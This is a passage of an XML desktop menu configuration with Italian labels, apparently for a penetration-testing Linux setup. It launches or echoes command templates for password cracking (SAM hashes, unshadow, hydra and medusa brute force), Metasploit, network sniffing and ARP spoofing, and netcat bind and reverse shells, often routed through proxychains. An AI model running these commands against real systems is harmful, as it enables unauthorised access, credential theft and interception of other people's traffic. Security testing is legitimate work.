				<item label=£+SmbClient Server Connection£+><action name=£+Execute£+><action>roxterm -e echo £+smbclient //SERVER/condivisione£+</action></action></item>
				<item label=£+SmbClient List Shared Folder On SERVER£+><action name=£+Execute£+><action>roxterm -e echo £+smbclient -L IPServer£+</action></action></item>
			</menu>
			<item label=£+Access To Swat£+><action name=£+Execute£+><action>midori -p http://localhost:901</action></action></item>
			<item label=£+Gadmin-Samba£+><action name=£+Execute£+><action>/usr/sbin/gadmin-samba</action></action></item>
			<item label=£+Edit Smb.conf£+><action name=£+Execute£+><action>geany /etc/samba/smb.conf</action></action></item>
			<item label=£+Edit Smb.conf.original£+><action name=£+Execute£+><action>geany /etc/samba/smb.conf.original</action></action></item>
			<item label=£+View Log£+><action name=£+Execute£+><action>geany /var/log/samba/log.%m</action></action></item>
		</menu>
	</menu>
	<menu id=£+root-menu-10£+ label=£+Connessioni£+>
		<menu id=£+root-menu-10-1£+ label=£+Eth0£+>
			<item label=£+Eth0 Down£+><action name=£+Execute£+><execute>roxterm -e ifconfig eth0 down</execute></action></item>
			<item label=£+Eth0 Up£+><action name=£+Execute£+><execute>roxterm -e ifconfig eth0 up</execute></action></item>
			<item label=£+Eth0 Mode Managed£+><action name=£+Execute£+><execute>roxterm -e ifconfig eth0 mode managed</execute></action></item>
			<item label=£+Dhclient Eth0£+><action name=£+Execute£+><execute>roxterm -e dhclient eth0</execute></action></item>
		</menu>
		<menu id=£+root-menu-10-2£+ label=£+Wlan0£+>
			<item label=£+Wlan0 Down£+><action name=£+Execute£+><execute>roxterm -e ifconfig wlan0 down</execute></action></item>
			<item label=£+Wlan0 Up£+><action name=£+Execute£+><execute>roxterm -e ifconfig wlan0 up</execute></action></item>
			<item label=£+Wlan0 Mode Managed£+><action name=£+Execute£+><execute>roxterm -e iwconfig wlan0 mode managed</execute></action></item>
			<item label=£+Connessione WEP£+><action name=£+Execute£+><execute>roxterm -e echo £+iwconfig wlan0 essid [nome_rete] key [chiave-wep] mode managed£+</execute></action></item>
			<item label=£+Dhclient Wlan0£+><action name=£+Execute£+><execute>roxterm -e dhclient wlan0</execute></action></item>
			<menu id=£+root-menu-10-2-1£+ label=£+Connection Without Dhclient£+>
				<item label=£+Wlan0 Down£+><action name=£+Execute£+><execute>roxterm -e ifconfig wlan0 down</execute></action></item>
				<item label=£+Find Essid-MAC-Channel£+><action name=£+Execute£+><execute>roxterm -e iwlist wlan0 scanning | egrep 'Channel|Address|ESSID'</execute></action></item>
				<item label=£+Set wlan0 parametres£+><action name=£+Execute£+><execute>roxterm -e echo £+iwconfig wlan0 channel [channel] essid [essid] ap [MAC]£+</execute></action></item>
				<item label=£+Wlan0 Up£+><action name=£+Execute£+><execute>roxterm -e ifconfig wlan0 up</execute></action></item>
				<item label=£+Obtaining IP£+><action name=£+Execute£+><execute>roxterm -e echo £+ifconfig wlan0 [IP] netmask 255.255.255.0£+</execute></action></item>
				<item label=£+Add Default Gateway£+><action name=£+Execute£+><execute>roxterm -e echo £+route add default gateway [IP Gateway]£+</execute></action></item>
				<item label=£+Add DNS (208.67.222.222)£+><action name=£+Execute£+><execute>roxterm -e sh -c £+echo nameserver 87.118.111.215 > /etc/resolv.conf£+</execute></action></item>
			</menu>
		</menu>
		<menu id=£+root-menu-10-3£+ label=£+Wicd£+>
			<item label=£+Wicd Daemon£+><action name=£+Execute£+><execute>wicd</execute></action></item>
			<item label=£+Wicd-Client£+><action name=£+Execute£+><execute>roxterm -e wicd-client --no-tray</execute></action></item>
			<item label=£+Wicd-Curses£+><action name=£+Execute£+><execute>roxterm -e wicd-curses</execute></action></item>
			<item label=£+Kill Wicd£+><action name=£+Execute£+><execute>killall wicd</execute></action></item>
			<item label=£+Edit manager-settings.conf£+><action name=£+Execute£+><execute>geany /etc/wicd/manager-settings.conf</execute></action></item>
			<item label=£+Edit wired-settings.conf£+><action name=£+Execute£+><execute>geany /etc/wicd/wired-settings.conf</execute></action></item>
			<item label=£+Edit wireless-settings.conf£+><action name=£+Execute£+><execute>geany /etc/wicd/wireless-settings.conf</execute></action></item>
		</menu>
		<item label=£+Ifconfig£+><action name=£+Execute£+><execute>roxterm -e ifconfig</execute></action></item>
		<item label=£+Iwconfig£+><action name=£+Execute£+><execute>roxterm -e iwconfig</execute></action></item>
		<item label=£+Etherape£+><action name=£+Execute£+><execute>etherape</execute></action></item>
		<item label=£+Iwlist Scan£+><action name=£+Execute£+><execute>roxterm -e iwlist scan</execute></action></item>
		<item label=£+Find Essid-MAC-Channel£+><action name=£+Execute£+><execute>roxterm -e iwlist scan | egrep 'Channel|Address|ESSID'</execute></action></item>
	</menu>
	<separator/>
	<menu id=£+root-menu-11£+ label=£+Pentest£+>
		<item label=£+IP Forward£+><action name=£+Execute£+><execute>roxterm -e echo £+1£+ > /proc/sys/net/ipv4/ip_forward</execute></action></item>
		<menu id=£+root-menu-11-1£+ label=£+Bluetooth£+>
			<item label=£+BlueDiving£+><action name=£+Execute£+><execute>roxterm -e perl /pentest/bluediving-0.9/bluediviNG.pl</execute></action></item>
			<item label=£+BluemanWho£+><action name=£+Execute£+><execute>bluemanWho</execute></action></item>
			<item label=£+Bluetooth Settings£+><action name=£+Execute£+><execute>bluetooth-properties</execute></action></item>
			<menu id=£+root-menu-11-1-1£+ label=£+Hci£+>
				<item label=£+Hciconfig£+><action name=£+Execute£+><execute>roxterm -e hciconfig</execute></action></item>
				<item label=£+Hci0 Down£+><action name=£+Execute£+><execute>roxterm -e hciconfig hci0 down</execute></action></item>
				<item label=£+Hci0 Up£+><action name=£+Execute£+><execute>roxterm -e hciconfig hci0 up</execute></action></item>
				<item label=£+Thunar /etc/bluetooth£+><action name=£+Execute£+><execute>thunar /etc/bluetooth</execute></action></item>
				<menu id=£+root-menu-11-1-1-1£+ label=£+HciTool£+>
					<item label=£+hcitool -h£+><action name=£+Execute£+><execute>roxterm hcitool -h</execute></action></item>
					<item label=£+Hcitool Scan£+><action name=£+Execute£+><execute>roxterm -e hcitool scan</execute></action></item>
					<item label=£+Hcitool Inquire£+><action name=£+Execute£+><execute>roxterm -e hcitool inq</execute></action></item>
					<item label=£+Hcitool Info£+><action name=£+Execute£+><execute>roxterm -e echo £+hcitool info [mac adress dispositivo bluetooth]£+</execute></action></item>
					<item label=£+Hcitool Received Signal Strenght£+><action name=£+Execute£+><execute>roxterm -e echo £+hcitool rssi [mac adress dispositivo bluetooth]£+</execute></action></item>
					<item label=£+Hcitool LinkQuality£+><action name=£+Execute£+><execute>roxterm -e echo £+hcitool lq [mac adress dispositivo bluetooth]£+</execute></action></item>
				</menu>
			</menu>
		</menu>
		<menu id=£+root-menu-11-2£+ label=£+Crackers£+>
			<menu id=£+root-menu-11-2-1£+ label=£+Offline£+>
				<menu id=£+root-menu-11-2-1-1£+ label=£+Chntpw£+>
					<item label=£+Chntpw --help£+><action name=£+Execute£+><execute>roxterm -e chntpw --help</execute></action></item>
					<item label=£+Chtnpw List Users£+><action name=£+Execute£+><execute>roxterm -e echo £+chntpw -l /media/windows/WINDOWS/system32/config/SAM£+</execute></action></item>
					<item label=£+Chtnpw List Users (Interactive)£+><action name=£+Execute£+><execute>roxterm -e echo £+chntpw -i /media/windows/WINDOWS/system32/config/SAM£+</execute></action></item>
					<menu id=£+root-menu-11-2-1-1£+ label=£+Registry Editor£+>
						<item label=£+SYSTEM£+><action name=£+Execute£+><execute>roxterm -e echo £+chntpw -e /media/windows/WINDOWS/system32/config/SYSTEM£+</execute></action></item>
						<item label=£+NTuser.dat£+><action name=£+Execute£+><execute>roxterm -e echo £+chntpw -e /media/windows/WINDOWS/system32/config/NTuser.dat£+</execute></action></item>
						<item label=£+SAM£+><action name=£+Execute£+><execute>roxterm -e echo £+chntpw -e /media/windows/WINDOWS/system32/config/SAM£+</execute></action></item>
						<item label=£+SECURITY£+><action name=£+Execute£+><execute>roxterm -e echo £+chntpw -e /media/windows/WINDOWS/system32/config/SECURITY£+</execute></action></item>
						<item label=£+SOFTWARE£+><action name=£+Execute£+><execute>roxterm -e echo £+chntpw -e /media/windows/WINDOWS/system32/config/SOFTWARE£+</execute></action></item>
						<item label=£+DEFAULT£+><action name=£+Execute£+><execute>roxterm -e echo £+chntpw -e /media/windows/WINDOWS/system32/config/DEFAULT£+</execute></action></item>
					</menu>
				</menu>
				<menu id=£+root-menu-11-2-1-2£+ label=£+John The Ripper£+>
					<item label=£+John£+><action name=£+Execute£+><execute>roxterm -e echo £+john --single [--wordlist=FILE] --show --format=[DES | BSDI | MD5 | BF | AFS | LM | NT | mscash | NETLM | NETNTLM | bfegg | DOMINOSEC | lotus5 | raw-MD5 | raw-sha1 | IPB2 | nsldap | openssha | HDAA] [hash file]£+</execute></action></item>
					<item label=£+View Installed Patches£+><action name=£+Execute£+><execute>geany /pentest/john/patches.list</execute></action></item>
					<item label=£+John Bruteforce Single Crack Mode£+><action name=£+Execute£+><execute>roxterm -e echo £+john -single [--wordlist=FILE | --stdin] [percorso file hash]£+</execute></action></item>
					<item label=£+John Bruteforce Wordlist Mode£+><action name=£+Execute£+><execute>roxterm -e echo £+john --wordlist=FILE [percorso file hash]£+</execute></action></item>
					<item label=£+John restore£+><action name=£+Execute£+><execute>roxterm -e echo john -restore:restore</execute></action></item>
					<item label=£+John Test£+><action name=£+Execute£+><execute>roxterm -e echo john -test</execute></action></item>
					<menu id=£+root-menu-11-2-1-2-1£+ label=£+Window£+>
						<item label=£+John Bruteforce SAM (Windows)£+><action name=£+Execute£+><execute>roxterm -e echo £+john [-single | --wordlist=FILE] /media/windows/WINDOWS/system32/config/SAM£+</execute></action></item>
					</menu>
					<menu id=£+root-menu-11-2-1-2-2£+ label=£+Linux£+>
						<item label=£+Unshadow£+><action name=£+Execute£+><execute>roxterm -e echo £+unshadow /media/Linux/etc/passwd /media/Linux/etc/shadow > psswd[l]£+</execute></action></item>
						<item label=£+John Bruteforce psswd[l]£+><action name=£+Execute£+><execute>roxterm -e echo £+john [-single | --wordlist=FILE] psswd[l]£+</execute></action></item>
					</menu>
					<item label=£+Drar£+><action name=£+Execute£+><execute>roxterm -e echo £+drar [file rar]£+</execute></action></item>
				</menu>
				<item label=£+Pdfcrack£+><action name=£+Execute£+><execute>roxterm -e echo £+pdfcrack [percorso file pdf]£+</execute></action></item>
				<item label=£+Rarcrack£+><action name=£+Execute£+><execute>roxterm -e echo £+rarcrack -t [threads 2/12] [percorso file rar/zip/7z]£+</execute></action></item>
				<menu id=£+root-menu-11-2-1-3£+ label=£+RainbowTables£+>
					<menu id=£+root-menu-11-2-1-3-1£+ label=£+Drcrack£+>
						<item label=£+Drcrack Attack£+><action name=£+Execute£+><execute>roxterm -e echo £+drcrack [rainbowntablesn | -d rainbowntables dictionary] [-h hash | -l hash_list | -f pwdump_file]£+</execute></action></item>
						<item label=£+Dr_Rules£+><action name=£+Execute£+><execute>roxterm -e dr_rules</execute></action></item>
						<menu id=£+root-menu-11-2-1-3-1-1£+ label=£+Drtgen£+>
							<item label=£+Drtgen help£+><action name=£+Execute£+><execute>roxterm -e drtgen</execute></action></item>
							<item label=£+Supported Hash Type£+><action name=£+Execute£+><execute>roxterm -e bash /pentest/drcrack/supported_hash_type.sh</execute></action></item>
							<item label=£+Drtgen Bench£+><action name=£+Execute£+><execute>roxterm -e echo £+drtgen -bench -hash [hash type] -cLen -cCount [chain n] -threads [n]£+</execute></action></item>
							<item label=£+Drtgen Generic£+><action name=£+Execute£+><execute>roxterm -e echo £+drtgen -file [rtable name] -hash [hash type] -cLen [chain length] -cCount [chain n] -threads [n] -charset [byte-256c] -lmin -lmax£+</execute></action></item>
							<item label=£+Drtgen Dictionary£+><action name=£+Execute£+><execute>roxterm -e echo £+drtgen -file [rtable name] -hash [hash type] -cLen [chain length] -cCount [chain n] -threads [n] -d -dic [wordlist] -rules [mangling rule file]£+</execute></action></item>
						</menu>
						<item label=£+Rcalc_Raw£+><action name=£+Execute£+><execute>roxterm -e echo £+rcalc_raw [chainlen] [chains] [tables] [parts] [keyspace]£+</execute></action></item>
						<item label=£+Rtdump£+><action name=£+Execute£+><execute>roxterm -e echo £+rtdump [rainbow_table_pathname] [rainbow_chain_index]£+</execute></action></item>
						<item label=£+Rtsort£+><action name=£+Execute£+><execute>roxterm -e echo £+rtsort [rainbow_table_pathname]£+</execute></action></item>
					</menu>
				</menu>
				<menu id=£+root-menu-11-2-1-4£+ label=£+GPGPU£+>
					<menu id=£+root-menu-11-2-1-4-1£+ label=£+Cuda£+>
						<menu id=£+root-menu-11-2-1-4-1-1£+ label=£+Crark£+>
							<item label=£+Crark£+><action name=£+Execute£+><execute>roxterm -e echo £+crark [percorso file rar]£+</execute></action></item>
							<item label=£+Crark-hp£+><action name=£+Execute£+><execute>roxterm -e echo £+crark-hp [percorso file rar]£+</execute></action></item>
						</menu>
						<item label=£+Cuda-Multiforcer£+><action name=£+Execute£+><execute>roxterm -e echo £+cuda-multiforcer -C charsets/charset[full/lower/lowernumeric/lowerupper/numeric/uppernumeric] -f [file hash] --min [1] --max [14)] -h [NTLM/MD4/MD5]£+</execute></action></item>
					</menu>
					<menu id=£+root-menu-11-2-1-4-2£+ label=£+OpenCl£+>
					</menu>
				</menu>
			</menu>
			<menu id=£+root-menu-11-2-2£+ label=£+Online£+>
				<item label=£+BruteSSH£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) python /pentest/brutessh/brutessh.py -h [targethost] -u [user] -d [passwordict] -t [threads]£+</execute></action></item>
				<menu id=£+root-menu-11-2-2-1£+ label=£+Hydra£+>
					<item label=£+Hydra Help£+><action name=£+Execute£+><execute>roxterm -e hydra</execute></action></item>
					<item label=£+Hydra Gui£+><action name=£+Execute£+><execute>roxterm -e proxychains xhydra</execute></action></item>
					<item label=£+Hydra£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] [-4|-6] [-x MIN:MAX:CHARSET] [server service [OPT]]|[service://server[:PORT][/pentest]]£+</execute></action></item>
				</menu>
				<menu id=£+root-menu-11-2-2-2£+ label=£+Medusa£+>
					<item label=£+Medua Help£+><action name=£+Execute£+><execute>roxterm -e medusa -h</execute></action></item>
					<item label=£+Medusa Router Attack£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) medusa -h [ip router] -U [username list] -P [password list] -e ns -f -M http -v 6£+</execute></action></item>
					<item label=£+Medusa£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]£+</execute></action></item>
				</menu>
			</menu>
		</menu>
		<menu id=£+root-menu-11-3£+ label=£+Database£+>
			<item label=£+HexorBase£+><action name=£+Execute£+><execute>roxterm -e python /pentest/Database/hexorbase/execute.py</execute></action></item>
			<menu id=£+root-menu-11-3-1£+ label=£+SQL Map£+>
				<item label=£+SQL Map Help£+><action name=£+Execute£+><execute>roxterm -e proxychains python /pentest/Database/sqlmap/sqlmap.py -h</execute></action></item>
				<item label=£+Edit sqlmap.conf£+><action name=£+Execute£+><execute>geany /pentest/SQL/sqlmap/sqlmap.conf</execute></action></item>
			</menu>
			<menu id=£+root-menu-11-3-2£+ label=£+SQL Ninja£+>
				<item label=£+SQL Ninja£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) sqlninja [IP]£+</execute></action></item>
				<item label=£+Edit sqlninja.conf£+><action name=£+Execute£+><execute>geany /pentest/SQL/sqlninja-0.2.5/sqlninja.conf</execute></action></item>
			</menu>
		</menu>
		<menu id=£+root-menu-11-4£+ label=£+Exploiting£+>
			<menu id=£+root-menu-11-4-1£+ label=£+Inguma£+>
				<item label=£+IngumaGui£+><action name=£+Execute£+><execute>roxterm -e proxychains python /pentestinguma/inguma.py</execute></action></item>
				<item label=£+IngumaCli£+><action name=£+Execute£+><execute>roxterm -e proxychains python /pentest/inguma/ingumagui.py</execute></action></item>
				<item label=£+Inguma TUTORIAL.txt£+><action name=£+Execute£+><execute>geany /pentest/inguma/TUTORIAL.txt</execute></action></item>
			</menu>
			<menu id=£+root-menu-11-4-2£+ label=£+Metasploit£+>
				<item label=£+Mysql Start£+><action name=£+Execute£+><execute>roxterm -e /etc/init.d/mysql start</execute></action></item>
				<menu id=£+root-menu-11-4-2-1£+ label=£+Armitage (Metasploit GUI)£+>
					<item label=£+Msfrpcd£+><action name=£+Execute£+><execute>roxterm -e ruby /pentest/metasploit/msf3/msfrpcd -f -U msf -P test -t Basic</execute></action></item>
					<item label=£+Armitage (Metasploit GUI)£+><action name=£+Execute£+><execute>java -jar /pentest/metasploit3/armitage/armitage.jar</execute></action></item>
				</menu>
				<item label=£+MsfCli£+><action name=£+Execute£+><execute>roxterm -e proxychains ruby /pentest/metasploit3/msf3/msfcli</execute></action></item>
				<item label=£+MsfConsole£+><action name=£+Execute£+><execute>roxterm -e proxychains ruby /pentest/metasploit3/msf3/msfconsole</execute></action></item>
				<item label=£+MsfGui£+><action name=£+Execute£+><execute>roxterm -e proxychains ruby /pentest/metasploit3/msf3/msfgui</execute></action></item>
				<item label=£+MsfUpdate£+><action name=£+Execute£+><execute>roxterm -e proxychains ruby /pentest/metasploit3/msf3/msfupdate</execute></action></item>
			</menu>
			<menu id=£+root-menu-11-4-3£+ label=£+Social Engineer Toolkit£+>
				<item label=£+Start SET£+><action name=£+Execute£+><execute>roxterm -e bash /pentest/set/set</execute></action></item>
				<item label=£+Edit set_config£+><action name=£+Execute£+><execute>geany /pentest/set/config/set_config</execute></action></item>
			</menu>
		</menu>
		<menu id=£+root-menu-11-5£+ label=£+Forensic£+>
			<menu id=£+root-menu-11-5-1£+ label=£+Fuzzers£+>
				<menu id=£+root-menu-11-5-1-1£+ label=£+Union Fuzzer£+>
					<item label=£+Union Fuzzer Help£+><action name=£+Execute£+><execute>roxterm -e echo £+python /pentest/unionfuzzer/uniofuzz.py --help£+</execute></action></item>
					<item label=£+Union Fuzzer Browser£+><action name=£+Execute£+><execute>roxterm -e echo £+python /pentest/unionfuzzer/uniofuzz.py -b [template.html] -m [number of files] -e [extension: html/php/aspx] -o [output folder: /var/www]£+</execute></action></item>
					<item label=£+Union Fuzzer File£+><action name=£+Execute£+><execute>roxterm -e echo £+python /pentest/unionfuzzer/uniofuzz.py -f -m [number of files] -e [extension: m3u/ini/pdf] -o [output folder: /home/user/files]£+</execute></action></item>
					<item label=£+Union Fuzzer Net Service£+><action name=£+Execute£+><execute>roxterm -e echo £+python /pentest/unionfuzzer/uniofuzz.py -n -i [interval: 0.01] -ip [victim IP] -port [port number] £+</execute></action></item>
					<item label=£+Union Fuzzer Pipe to Program£+><action name=£+Execute£+><execute>roxterm -e echo £+python /pentest/unionfuzzer/uniofuzz.py -p -m [number of files] -i [interval: 1.5] -d [program to execute: '/bin/ls -n']£+</execute></action></item>
				</menu>
			</menu>
			<item label=£+Geoedge£+><action name=£+Execute£+><execute>roxterm -e echo £+python /pentest/geoedge.py [IP/Url]£+</execute></action></item>
			<item label=£+MediaInfo (GUI)£+><action name=£+Execute£+><execute>mediainfo-gui</execute></action></item>
			<item label=£+TheHarvester£+><action name=£+Execute£+><execute>roxterm -e echo £+python /pentest/theHarvester-ng/theHarvester.py -d [Domain] -b [google | bing | bingapi | pgp | linkedin | google-profiles | exalead | all]£+</execute></action></item>
		</menu>
		<menu id=£+root-menu-11-6£+ label=£+Net£+>
			<menu id=£+root-menu-11-6-1£+ label=£+Netcat£+>
				<item label=£+Netcat Help£+><action name=£+Execute£+><execute>roxterm -e nc -h</execute></action></item>
				<menu id=£+root-menu.10-5-1-1£+ label=£+File transfer£+>
					<item label=£+Destinatario£+><action name=£+Execute£+><execute>roxterm -e echo £+nc -l -vv -p [Porta] -w [seconds] -x -o [file log]> [file di output]£+</execute></action></item>
					<item label=£+Mittente£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) nc -vv -n [IP Destinatario] [port/ports' range] [reverse >] [file input]£+</execute></action></item>
				</menu>
				<item label=£+Netcat PortScanning TCP£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) nc -vv -n -z [Target IP] [range porte]£+</execute></action></item>
				<item label=£+Netcat PortScanning UDP£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) nc -vv -n -u -z [Target IP] [range porte]£+</execute></action></item>
				<item label=£+Netcat Banner Grabbing£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) nc -vv [target IP] [port] | HEAD / HTTP/1.0£+</execute></action></item>
				<menu id=£+root-menu.10-5-1-2£+ label=£+Bind Shell£+>
					<item label=£+Server£+><action name=£+Execute£+><execute>roxterm -e echo £+nc -lp [port] -e [program] -x -o [file log]</execute></action></item>
					<item label=£+Client£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) nc -vv [target IP] [port]</execute></action></item>
				</menu>
				<menu id=£+root-menu.10-5-1-1£+ label=£+Reverse Shell£+>
					<item label=£+Server£+><action name=£+Execute£+><execute>roxterm -e echo £+nc -l -p [port]£+</execute></action></item>
					<item label=£+Client£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) nc -vv [Target IP] -p [porta] -c [shell path | /bin/bash</execute></action></item>
				</menu>
			</menu>
			<menu id=£+root-menu-11-6-2£+ label=£+Netdiscover£+>
				<item label=£+Netdiscover£+><action name=£+Execute£+><execute>roxterm -e echo £+netdiscover [-i device] [-r range | -p] [-s time] [-n node] [-c count] [-f (Fast)] [-S (HardCore)]£+</execute></action></item>
				<item label=£+Netdiscover Help£+><action name=£+Execute£+><execute>roxterm -e netdiscover --help</execute></action></item>
				<menu id=£+root-menu-11-6-2-1£+ Label=£+Interfaces£+>
					<item label=£+Netdiscover Eth0£+><action name=£+Execute£+><execute>roxterm -e netdiscover -i eth0 -f</execute></action></item>
					<item label=£+Netdiscover Eth1£+><action name=£+Execute£+><execute>roxterm -e netdiscover -i eth1 -f</execute></action></item>
					<item label=£+Netdiscover Wlan0£+><action name=£+Execute£+><execute>roxterm -e netdiscover -i wlan0 -f</execute></action></item>
					<item label=£+Netdiscover Mon0£+><action name=£+Execute£+><execute>roxterm -e netdiscover -i mon0 -f</execute></action></item>
				</menu>
			</menu>
			<menu id=£+root-menu-11-6-3£+ label=£+Nmap£+>
				<item label=£+Zenmap (Nmap GUI)£+><action name=£+Execute£+><execute>zenmap</execute></action></item>
				<item label=£+Nmap -h£+><action name=£+Execute£+><execute>roxterm -e nmap -h</execute></action></item>
				<item label=£+Nmap 192.168.0.0-255 (-sP Ping)£+><action name=£+Execute£+><execute>roxterm -e nmap -sP 192.168.0.0-255</execute></action></item>
				<item label=£+Nmap 192.168.1.0-255 (-sP Ping)£+><action name=£+Execute£+><execute>roxterm -e nmap -sP 192.168.1.0-255</execute></action></item>
				<item label=£+Nmap Connect Scan (-sT)£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) nmap -vvv -sT [targetIP]£+</execute></action></item>
				<item label=£+Nmap Version Scan (-sV -T AGGRESSIVE)£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) nmap -vvv -sV -T AGGRESSIVE [targetIP]£+</execute></action></item>
				<item label=£+Nmap Udp Connection (-sU)£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) nmap -vvv -sU [targetIP]£+</execute></action></item>
				<item label=£+Nmap Syn Stealth (-sS)£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) nmap -vvv -sS -T AGGRESSIVE [targetIP]£+</execute></action></item>
				<item label=£+Nmap Decoy (-D)£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) nmap -D [falseIPs] [targetIP]£+</execute></action></item>
				<item label=£+Nmap Full Scan(-sT -sR -sV -O -F -A -D -T AGGRESSIVE -vvv)£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) nmap -sT -sR -sV -O -F -A -D [falseIPs] -T AGGRESSIVE -vvv [targetIP]£+</execute></action></item>
			</menu>
		</menu>
		<menu id=£+root-menu-11-7£+ label=£+Sniffers£+>
			<menu id=£+root-menu-11-7-1£+ label=£+Driftnet£+>
				<item label=£+Driftnet Eth0£+><action name=£+Execute£+><execute>roxterm -e driftnet -i eth0 -v</execute></action></item>
				<item label=£+Driftnet Eth1£+><action name=£+Execute£+><execute>roxterm -e driftnet -i eth1 -v</execute></action></item>
				<item label=£+Driftnet Wlan0£+><action name=£+Execute£+><execute>roxterm -e driftnet -i wlan0 -v</execute></action></item>
				<item label=£+Driftnet Mon0£+><action name=£+Execute£+><execute>roxterm -e driftnet -i mon0 -v</execute></action></item>
				<item label=£+Driftnet --help£+><action name=£+Execute£+><execute>roxterm -e driftnet --help</execute></action></item>
			</menu>
			<menu id=£+root-menu-11-7-2£+ label=£+Dsniff Pack£+>
				<menu id=£+root-menu-11-7-2-1£+ label=£+Arpspoof£+>
					<item label=£+Arpspoof£+><action name=£+Execute£+><execute>roxterm -e echo £+arpspoof -i [interface] -t [targetip] [routerip]£+</execute></action></item>
					<item label=£+Arpspoof Help£+><action name=£+Execute£+><execute>roxterm -e arpspoof --help£+</execute></action></item>
				</menu>
				<menu id=£+root-menu-11-7-2-2£+ label=£+Dsniff£+>
					<item label=£+Dsniff Options£+><action name=£+Execute£+><execute>roxterm -e echo £+dsniff [-cdmn] [-i interface | -p pcapfile] [-s snaplen] [-f services] [-t trigger[,...]] [-r|-w savefile] [expression]£+</execute></action></item>
					<menu id=£+root-menu-11-7-2-2-1£+ label=£+Interfaces£+>
						<item label=£+Dsniff Eth0£+><action name=£+Execute£+><execute>roxterm -e dsniff -i eth0</execute></action></item>
						<item label=£+Dsniff Eth1£+><action name=£+Execute£+><execute>roxterm -e dsniff -i eth1</execute></action></item>
						<item label=£+Dsniff Wlan0£+><action name=£+Execute£+><execute>roxterm -e dsniff -i wlan0</execute></action></item>
						<item label=£+Dsniff Mon0£+><action name=£+Execute£+><execute>roxterm -e dsniff -i mon0</execute></action></item>
					</menu>
				</menu>
				<menu id=£+root-menu-11-7-2-3£+ label=£+Filesnarf£+>
					<item label=£+Filesnarf Options£+><action name=£+Execute£+><execute>roxterm -e echo £+filesnarf [-i interface | -p pcapfile] [[-v] pattern [expression]£+</execute></action></item>
					<menu id=£+root-menu-11-7-2-3-1£+ label=£+Interfaces£+>
						<item label=£+Filesnarf Eth0£+><action name=£+Execute£+><execute>roxterm -e filesnarf -i eth0</execute></action></item>
						<item label=£+Filesnarf Eth1£+><action name=£+Execute£+><execute>roxterm -e filesnarf -i eth1</execute></action></item>
						<item label=£+Filesnarf Wlan0£+><action name=£+Execute£+><execute>roxterm -e filesnarf -i wlan0</execute></action></item>
						<item label=£+Filesnarf Mon0£+><action name=£+Execute£+><execute>roxterm -e filesnarf -i mon0</execute></action></item>
					</menu>
				</menu>
				<menu id=£+root-menu-11-7-2-4£+ label=£+Macof£+>
					<item label=£+Macof Options£+><action name=£+Execute£+><execute>roxterm -e echo £+macof [-s src] [-d dst] [-e tha] [-x sport] [-y dport] [-i interface] [-n times]£+</execute></action></item>
					<menu id=£+root-menu-11-7-2-4-1£+ label=£+Interfaces£+>
						<item label=£+Macof Eth0£+><action name=£+Execute£+><execute>roxterm -e macof -i eth0</execute></action></item>
						<item label=£+Macof Eth1£+><action name=£+Execute£+><execute>roxterm -e macof -i eth1</execute></action></item>
						<item label=£+Macof Wlan0£+><action name=£+Execute£+><execute>roxterm -e macof -i wlan0</execute></action></item>
						<item label=£+Macof Mon0£+><action name=£+Execute£+><execute>roxterm -e macof -i mon0</execute></action></item>
					</menu>
				</menu>
				<menu id=£+root-menu-11-7-2-5£+ label=£+Mailsnarf£+>
					<item label=£+Mailsnarf Options£+><action name=£+Execute£+><execute>roxterm -e echo £+mailsnarf [-i interface | -p pcapfile] [[-v] pattern [expression]]£+</execute></action></item>
					<menu id=£+root-menu-11-7-2-5-1£+ label=£+Interfaces£+>
						<item label=£+Mailsnarf Eth0£+><action name=£+Execute£+><execute>roxterm -e mailsnarf -i eth0</execute></action></item>
						<item label=£+Mailsnarf Eth1£+><action name=£+Execute£+><execute>roxterm -e mailsnarf -i eth1</execute></action></item>
						<item label=£+Mailsnarf Wlan0£+><action name=£+Execute£+><execute>roxterm -e mailsnarf -i wlan0</execute></action></item>
						<item label=£+Mailsnarf Mon0£+><action name=£+Execute£+><execute>roxterm -e mailsnarf -i mon0</execute></action></item>
					</menu>
				</menu>
				<menu id=£+root-menu-11-7-2-6£+ label=£+Msgsnarf£+>
					<item label=£+Msgsnarf Options£+><action name=£+Execute£+><execute>roxterm -e echo £+msgsnarf [-i interface | -p pcapfile] [[-v] pattern [expression]]£+</execute></action></item>
					<menu id=£+root-menu-11-7-2-6-1£+ label=£+Interfaces£+>
						<item label=£+Msgsnarf Eth0£+><action name=£+Execute£+><execute>roxterm -e msgsnarf -i eth0</execute></action></item>
						<item label=£+Msgsnarf Eth1£+><action name=£+Execute£+><execute>roxterm -e msgsnarf -i eth1</execute></action></item>
						<item label=£+Msgsnarf Wlan0£+><action name=£+Execute£+><execute>roxterm -e msgsnarf -i wlan0</execute></action></item>
						<item label=£+Msgsnarf Mon0£+><action name=£+Execute£+><execute>roxterm -e msgsnarf -i mon0</execute></action></item>
					</menu>
				</menu>
				<menu id=£+root-menu-11-7-2-7£+ label=£+Urlsnarf£+>
					<item label=£+Urlsnarf Options£+><action name=£+Execute£+><execute>roxterm -e echo £+urlsnarf  [-n] [-i interface | -p pcapfile] [[-v] pattern [expression]]£+</execute></action></item>
					<menu id=£+root-menu-11-7-2-7-1£+ label=£+Interfaces£+>
